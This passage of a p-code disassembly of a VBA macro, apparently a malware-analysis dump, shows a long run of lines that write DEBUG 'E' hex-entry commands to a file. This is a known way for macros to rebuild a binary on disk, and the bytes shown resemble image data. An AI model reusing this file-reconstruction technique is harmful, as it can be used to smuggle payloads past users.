' 	LitStr 0x0036 "E 04E0 E0 DE DF E0 DE DF E0 DC DF E0 DC DF E0 DE DF DF"
' 	PrintItemNL 
' Line #273:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04F0 DF DD DF DF DD DF DF DB E0 DF DB DF E0 DB DF E0"
' 	PrintItemNL 
' Line #274:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0500 DB DF E0 DD DF E0 E1 DE E0 E1 DE E0 E1 DF DF E1"
' 	PrintItemNL 
' Line #275:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0510 DF DE DF E0 DE DB E1 DC DA E1 DC DA E1 DC DD DF"
' 	PrintItemNL 
' Line #276:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0520 DF DD DF E0 DD DF E0 DD DF E0 DD DF E0 DF DE E0"
' 	PrintItemNL 
' Line #277:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0530 DF DE E0 DF DE E0 DF DE E0 E1 DE E0 E1 DE E0 E1"
' 	PrintItemNL 
' Line #278:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0540 DE E0 E1 DE E0 E1 DE E0 E3 DE E0 E1 DE E0 DD DC"
' 	PrintItemNL 
' Line #279:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0550 DE DF E1 E2 DD DC DE FD FF FF FF FE FF FD FF FF"
' 	PrintItemNL 
' Line #280:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0560 00 00 F9 F9 F9 F4 F4 F4 EB EB EB E2 E2 E2 DA DA"
' 	PrintItemNL 
' Line #281:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0570 DA D5 D5 D5 D3 D3 D3 D2 D2 D2 D1 D1 D1 D1 D1 D1"
' 	PrintItemNL 
' Line #282:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0580 D3 D1 D0 D3 D1 D0 D3 D1 D0 D3 D1 D0 D3 D1 D0 D3"
' 	PrintItemNL 
' Line #283:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0590 D1 D0 D1 D0 D2 D1 D0 D2 D1 D0 D2 D1 D0 D2 D1 D0"
' 	PrintItemNL 
' Line #284:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05A0 D2 D1 D0 D2 D1 D0 D2 D1 D0 D2 D1 D0 D2 D1 D0 D2"
' 	PrintItemNL 
' Line #285:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05B0 D1 D0 D2 D1 D0 D2 D1 D0 D2 D1 D0 D2 D1 D0 D2 CF"
' 	PrintItemNL 
' Line #286:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05C0 D1 D2 CC D1 D2 CA D2 D2 CD D1 D2 CF D1 D2 D1 D0"
' 	PrintItemNL 
' Line #287:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05D0 D4 D3 CF D4 D3 CF D5 D3 CF D5 D1 D0 D4 CF D0 D4"
' 	PrintItemNL 
' Line #288:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05E0 CF D1 D2 CD D2 D1 CF D1 D1 CF D2 D0 D1 D2 CE D1"
' 	PrintItemNL 
' Line #289:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05F0 D2 CE D3 D1 D1 D3 D1 D1 D3 D1 D1 D3 D1 D1 D1 D1"
' 	PrintItemNL 
' Line #290:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0600 D1 D1 D1 D1 D1 D1 D1 D1 D1 D1 CF D1 D1 CF D1 D1"
' 	PrintItemNL 
' Line #291:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0610 CF D1 D1 CF D1 D1 CD D2 D1 CD D2 D1 CD D2 D1 CF"
' 	PrintItemNL 
' Line #292:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0620 D1 D1 D1 D0 D2 D3 D0 D2 D3 D0 D2 D3 D0 D2 D3 D1"
' 	PrintItemNL 
' Line #293:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0630 D1 D3 D1 D1 D1 D1 D1 D1 D1 D1 D1 D2 D0 D1 D2 D0"
' 	PrintItemNL 
' Line #294:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0640 D1 D2 D0 D1 D2 D0 D1 D2 CE D1 D2 CE D1 D2 CE D1"
' 	PrintItemNL 
' Line #295:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0650 D2 CE D1 D1 D1 CF D1 D1 CF D1 D1 CD D2 D1 CD D1"
' 	PrintItemNL 
' Line #296:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0660 D2 CD D1 D2 CF D1 D2 D1 D0 D2 D3 D0 D2 D5 D0 D1"
' 	PrintItemNL 
' Line #297:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0670 D5 D0 D1 D3 D1 D0 D1 D2 CE CD D3 CE CC D4 CD CC"
' 	PrintItemNL 
' Line #298:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0680 D3 CE CF D1 D1 D1 D0 D2 D1 D0 D2 D1 D0 D2 D1 D0"
' 	PrintItemNL 
' Line #299:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0690 D2 D1 D0 D2 D3 D0 D2 D3 D0 D2 D3 D0 D2 D3 D0 D2"
' 	PrintItemNL 
' Line #300:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06A0 D5 D0 D2 D5 D0 D2 D5 D0 D2 D5 D0 D2 D5 D0 D2 D3"
' 	PrintItemNL 
' Line #301:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06B0 D0 D2 D1 CE D0 D2 D1 D3 CF CE D0 FC FB FD FD FC"
' 	PrintItemNL 
' Line #302:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06C0 FE FB FA FC 00 00 F2 F2 F2 EF EF EF E7 E7 E7 DC"
' 	PrintItemNL 
' Line #303:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06D0 DC DC CC CC CC CA CA CA CA CA CA C4 C4 C4 C8 C8"
' 	PrintItemNL 
' Line #304:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06E0 C8 C7 C7 C7 C1 BF BE C9 C7 C6 CB C9 C8 C4 C2 C1"
' 	PrintItemNL 
' Line #305:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06F0 C6 C4 C3 C2 C0 BF C1 C0 C2 C0 BF C1 C2 C1 C3 C5"
' 	PrintItemNL 
' Line #306:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0700 C4 C6 C3 C2 C4 BE BD BF BE BD BF C0 BF C1 C0 BF"
' 	PrintItemNL 
' Line #307:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0710 C1 C3 C2 C4 BF BE C0 C4 C3 C5 C4 C3 C5 C2 C1 C3"
' 	PrintItemNL 
' Line #308:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0720 C9 C8 CA C2 C4 C5 BD C2 C3 C1 C9 C9 C2 C6 C7 C2"
' 	PrintItemNL 
' Line #309:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0730 C4 C5 C6 C5 C9 C6 C2 C7 C5 C1 C7 CA C6 CC C3 C2"
' 	PrintItemNL 
' Line #310:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0740 C6 C1 C2 C6 BF C1 C2 BE C3 C2 C3 C5 C5 BF C2 C0"
' 	PrintItemNL 
' Line #311:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0750 BD BE BA C0 C1 BD C4 C2 C2 C3 C1 C1 C4 C2 C2 C5"
' 	PrintItemNL 
' Line #312:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0760 C3 C3 C5 C5 C5 C5 C5 C5 C4 C4 C4 C2 C2 C2 BF C1"
' 	PrintItemNL 
' Line #313:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0770 C1 BB BD BD C8 CA CA C0 C2 C2 C3 C8 C7 B8 BD BC"
' 	PrintItemNL 
' Line #314:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0780 BD C2 C1 C6 C8 C8 C2 C1 C3 C6 C3 C5 C4 C1 C3 C3"
' 	PrintItemNL 
' Line #315:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0790 C0 C2 C5 C3 C3 C4 C2 C2 C2 C2 C2 C9 C9 C9 C6 C7"
' 	PrintItemNL 
' Line #316:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07A0 C5 BF C0 BE CA CB C9 C7 C8 C6 BE BF BB CC CD C9"
' 	PrintItemNL 
' Line #317:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07B0 C1 C2 BE C3 C4 C0 C0 C0 C0 BC BE BE BF C1 C1 C1"
' 	PrintItemNL 
' Line #318:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07C0 C6 C5 BE C2 C3 BD C1 C2 C2 C4 C5 C4 C3 C5 C3 C0"
' 	PrintItemNL 
' Line #319:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07D0 C2 CD C8 C9 CA C5 C6 C4 C2 C1 CA CB C7 BB C1 BC"
' 	PrintItemNL 
' Line #320:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07E0 C1 C9 C2 BF C6 C1 C2 C4 C4 C5 C4 C6 C5 C4 C6 C6"
' 	PrintItemNL 
' Line #321:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07F0 C5 C7 C5 C4 C6 C3 C2 C4 C5 C2 C4 C5 C2 C4 C7 C4"
' 	PrintItemNL 
' Line #322:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0800 C6 C7 C4 C6 C3 BE C0 CB C6 C8 CC C7 C9 C6 C1 C3"
' 	PrintItemNL 
' Line #323:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0810 C9 C4 C6 C5 C2 C4 CB C8 CA C1 C0 C2 C1 C0 C2 FF"
' 	PrintItemNL 
' Line #324:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0820 FE FF FE FD FF FF FE FF 00 00 FF FF FF F4 F4 F4"
' 	PrintItemNL 
' Line #325:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0830 E3 E3 E3 D6 D6 D6 CE CE CE D4 D4 D4 B0 B0 B0 BE"
' 	PrintItemNL 
' Line #326:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0840 BE BE B6 B6 B6 BA BA BA B6 B6 B6 B9 BA B8 BB B9"
' 	PrintItemNL 
' Line #327:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0850 B9 B6 B7 B5 BC BA BA B5 B5 B5 BA B9 BB B7 B9 BA"
' 	PrintItemNL 
' Line #328:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0860 B9 B8 BA B7 B9 BA B9 B8 BA B8 BA BB BD BC BE BD"
' 	PrintItemNL 
' Line #329:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0870 BF C0 B6 B5 B7 B8 BA BB B6 B5 B7 B8 BA BB BA B9"
' 	PrintItemNL 
' Line #330:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0880 BB B4 B6 B7 BA B9 BB B4 B6 B7 B1 B6 B7 B0 B8 B8"
' 	PrintItemNL 
' Line #331:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0890 B5 BA BB B7 BB BC B9 B8 BC B8 B7 BB B9 B5 BB B6"
' 	PrintItemNL 
' Line #332:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08A0 B4 BA BB BA BE B3 B4 B8 B5 B9 BA B7 BB BC B5 B7"
' 	PrintItemNL 
' Line #333:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08B0 B7 BA BB B9 C0 C1 BF BB B9 B8 BB B9 B9 BA B8 B8"
' 	PrintItemNL 
' Line #334:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08C0 B9 B7 B7 BA B8 B8 BB B9 B9 BA BA BA B9 B9 B9 B8"
' 	PrintItemNL 
' Line #335:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08D0 B8 B8 BC BC BC BF C1 C1 B0 B2 B2 C0 C2 C2 A5 A7"
' 	PrintItemNL 
' Line #336:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08E0 A7 BF C4 C3 B8 BD BC B6 B8 B8 BE BD BF BA B9 BB"
' 	PrintItemNL 
' Line #337:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08F0 B8 B5 B7 B5 B4 B6 B9 B6 B8 B9 B9 B9 BA BA BA B8"
' 	PrintItemNL 
' Line #338:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0900 B8 B8 BE BE BE B8 B9 B7 BA BB B9 B6 B7 B5 B7 B8"
' 	PrintItemNL 
' Line #339:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0910 B6 BC BD B9 BE BF BB B6 B7 B5 C2 C2 C2 BB BD BD"
' 	PrintItemNL 
' Line #340:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0920 B6 B8 B8 AF B4 B3 AE B2 B3 B4 B8 B9 B5 B9 BA B4"
' 	PrintItemNL 
' Line #341:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0930 B6 B7 B6 B3 B5 B7 B4 B6 B5 B3 B3 AE AC AB BB BC"
' 	PrintItemNL 
' Line #342:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0940 BA B5 BB B6 B5 BC B7 B2 B9 B4 B5 B7 B7 B6 B8 B9"
' 	PrintItemNL 
' Line #343:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0950 B7 B9 BA B8 BA BB B8 BA BB B9 B8 BA B9 B8 BA B9"
' 	PrintItemNL 
' Line #344:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0960 B8 BA BD BC BE BF BC BE BA B7 B9 C0 BD BF C0 BD"
' 	PrintItemNL 
' Line #345:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0970 BF B8 B5 B7 BE B9 BB BB B8 BA B4 B3 B5 B5 B7 B8"
' 	PrintItemNL 
' Line #346:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0980 C0 BF C1 FA FC FD FD FC FE F4 F6 F7 00 00 F7 F7"
' 	PrintItemNL 
' Line #347:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0990 F7 E9 E9 E9 D8 D8 D8 D4 D4 D4 C9 C9 C9 A9 A9 A9"
' 	PrintItemNL 
' Line #348:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09A0 07 07 07 01 01 01 00 00 01 01 03 04 00 02 03 00"
' 	PrintItemNL 
' Line #349:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09B0 00 00 00 00 01 00 00 00 06 05 07 02 04 05 00 02"
' 	PrintItemNL 
' Line #350:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09C0 03 00 00 03 00 00 03 00 00 03 00 00 03 00 00 03"
' 	PrintItemNL 
' Line #351:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09D0 00 00 03 00 00 03 00 00 03 00 03 07 00 00 03 00"
' 	PrintItemNL 
' Line #352:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09E0 02 06 02 03 07 00 00 03 00 00 03 00 00 03 00 06"
' 	PrintItemNL 
' Line #353:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09F0 09 00 00 03 00 00 03 00 00 04 00 00 04 00 00 04"
' 	PrintItemNL 
' Line #354:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A00 02 00 06 00 00 04 00 00 04 00 00 03 00 02 03 00"
' 	PrintItemNL 
' Line #355:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A10 03 04 02 04 04 00 01 00 02 00 00 04 00 00 06 01"
' 	PrintItemNL 
' Line #356:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A20 02 04 00 00 04 00 00 02 00 00 02 00 00 02 00 00"
' 	PrintItemNL 
' Line #357:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A30 02 00 00 00 00 00 00 00 00 00 00 00 04 04 04 00"
' 	PrintItemNL 
' Line #358:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A40 00 00 05 07 07 00 00 00 00 00 00 01 03 03 00 00"
' 	PrintItemNL 
' Line #359:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A50 01 00 00 03 00 00 03 05 07 08 05 04 06 02 04 05"
' 	PrintItemNL 
' Line #360:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A60 06 08 09 00 00 00 00 00 00 00 00 00 07 07 07 0B"
' 	PrintItemNL 
' Line #361:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A70 0C 0A 0E 0F 0D 00 01 00 01 02 00 00 01 00 00 00"
' 	PrintItemNL 
' Line #362:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A80 00 00 00 00 06 08 09 00 03 04 00 01 04 02 07 0A"
' 	PrintItemNL 
' Line #363:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A90 00 03 06 00 00 03 00 00 03 01 00 02 0E 0E 0E 00"
' 	PrintItemNL 
' Line #364:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AA0 01 00 00 03 01 00 02 00 00 02 00 00 03 00 00 00"
' 	PrintItemNL 
' Line #365:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AB0 01 00 00 03 00 00 03 00 00 03 00 00 03 00 00 03"
' 	PrintItemNL 
' Line #366:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AC0 00 00 03 00 00 03 00 00 03 00 00 03 00 00 03 01"
' 	PrintItemNL 
' Line #367:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AD0 00 04 00 00 03 00 00 03 02 00 03 00 00 03 02 04"
' 	PrintItemNL 
' Line #368:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AE0 05 00 01 02 00 00 01 02 06 07 03 05 06 00 00 01"
' 	PrintItemNL 
' Line #369:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AF0 00 00 F5 F5 F5 EE EE EE DD DD DD D1 D1 D1 C6 C6"
' 	PrintItemNL 
' Line #370:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B00 C6 BB BB BB 09 09 09 42 44 44 50 52 53 55 57 58"
' 	PrintItemNL 
' Line #371:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B10 56 58 59 52 55 59 4E 51 55 4F 52 56 59 5C 60 60"
' 	PrintItemNL 
' Line #372:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B20 63 67 6A 6D 71 64 69 6C 64 69 6C 68 6D 70 65 6A"
' 	PrintItemNL 
' Line #373:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B30 6D 5A 5F 62 53 58 5B 53 58 5B 57 5C 5F 5B 60 63"
' 	PrintItemNL 
' Line #374:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B40 53 58 5B 58 5D 60 5A 5F 62 53 58 5B 56 5B 5E 58"
' 	PrintItemNL 
' Line #375:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B50 5D 60 55 5C 5F 55 5E 61 63 6A 6D 71 76 79 70 73"
' 	PrintItemNL 
' Line #376:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B60 78 65 68 6D 58 5B 60 4C 4F 54 60 64 69 6F 75 7A"
' 	PrintItemNL 
' Line #377:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B70 65 6A 6D 58 5C 5D 58 5A 5B 2D 2B 2B 13 0E 0F 17"
' 	PrintItemNL 
' Line #378:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B80 12 11 16 11 12 12 0D 0E 0E 09 0A 0C 07 08 0D 08"
' 	PrintItemNL 
' Line #379:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B90 09 0E 0C 0C 10 0E 0E 11 0F 0F 21 1F 1F 11 11 11"
' 	PrintItemNL 
' Line #380:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BA0 00 00 00 67 67 67 FF FF FF FA FC FC FD FF FF F3"
' 	PrintItemNL 
' Line #381:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BB0 F5 F6 CE CF D3 C3 C6 CA CD D0 D4 E9 EC F0 EB EE"
' 	PrintItemNL 
' Line #382:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BC0 F2 E5 E7 E8 E8 EA EB E2 E4 E5 EF EE F0 F1 F1 F1"
' 	PrintItemNL 
' Line #383:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BD0 EB EB EB D3 D3 D3 99 99 99 0F 10 0E 0D 0E 0C 10"
' 	PrintItemNL 
' Line #384:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BE0 10 10 12 12 12 37 36 38 5E 60 61 5F 64 65 57 5E"
' 	PrintItemNL 
' Line #385:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BF0 61 5A 61 64 57 5E 61 56 5B 5E 59 5C 60 4D 4E 52"
' 	PrintItemNL 
' Line #386:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C00 47 49 4A 13 15 15 00 00 00 01 04 02 22 27 25 5D"
' 	PrintItemNL 
' Line #387:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C10 64 61 52 5A 5A 54 5B 5E 53 5A 5D 50 57 5A 51 56"
' 	PrintItemNL 
' Line #388:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C20 59 51 56 59 4E 53 56 49 4E 51 47 4A 4E 47 4A 4E"
' 	PrintItemNL 
' Line #389:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C30 41 44 48 45 48 4C 45 46 4A 3E 3F 43 45 46 4A 45"
' 	PrintItemNL 
' Line #390:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C40 46 4A 3A 3E 3F 3A 3F 40 2F 34 35 28 2D 2E 1F 24"
' 	PrintItemNL 
' Line #391:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C50 25 00 04 05 00 00 F4 F4 F4 F1 F1 F1 E1 E1 E1 D1"
' 	PrintItemNL 
' Line #392:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C60 D1 D1 C1 C1 C1 BA BA BA 00 00 01 55 57 58 54 55"
' 	PrintItemNL 
' Line #393:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C70 59 4D 50 54 4F 52 56 4F 53 58 4B 4F 54 49 4D 52"
' 	PrintItemNL 
' Line #394:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C80 53 57 5C 61 67 6C 61 67 6C 58 5E 63 59 5F 64 62"
' 	PrintItemNL 
' Line #395:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C90 68 6D 5E 64 69 4E 54 59 48 4E 53 4D 53 58 62 68"
' 	PrintItemNL 
' Line #396:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CA0 6D 64 6A 6F 58 5E 63 5A 60 65 5D 63 68 54 5A 5F"
' 	PrintItemNL 
' Line #397:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CB0 56 5C 61 5C 62 67 5D 66 6A 5D 66 6A 60 66 6B 65"
' 	PrintItemNL 
' Line #398:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CC0 6B 70 6A 6D 75 60 63 6B 54 5A 61 54 5A 61 4A 52"
' 	PrintItemNL 
' Line #399:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CD0 59 58 61 65 57 5D 62 56 5B 5E 58 57 59 20 1B 1C"
' 	PrintItemNL 
' Line #400:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CE0 0B 05 06 16 0E 0F 17 11 12 12 0C 0D 0D 07 08 0B"
' 	PrintItemNL 
' Line #401:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CF0 05 06 0C 06 07 0F 0A 0B 12 0D 0E 11 0F 0F 10 0E"
' 	PrintItemNL 
' Line #402:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D00 0E 13 11 11 02 00 00 D4 D2 D2 FF FF FF FA FA FA"
' 	PrintItemNL 
' Line #403:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D10 FF FF FF FD FF FF D9 DC E0 C4 C8 CD BC C0 C5 DB"
' 	PrintItemNL 
' Line #404:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D20 DF E4 ED F1 F6 E8 EB EF E9 EC F0 E1 E5 E6 E0 E2"
' 	PrintItemNL 
' Line #405:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D30 E3 EC EE EF F5 F4 F6 E8 E7 E9 B4 B3 B5 0E 0E 0E"
' 	PrintItemNL 
' Line #406:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D40 00 00 00 0D 0D 0D 02 00 01 1C 1B 1F 55 56 5A 60"
' 	PrintItemNL 
' Line #407:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D50 65 68 51 5A 5E 55 60 64 58 63 67 5C 65 69 50 56"
' 	PrintItemNL 
' Line #408:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
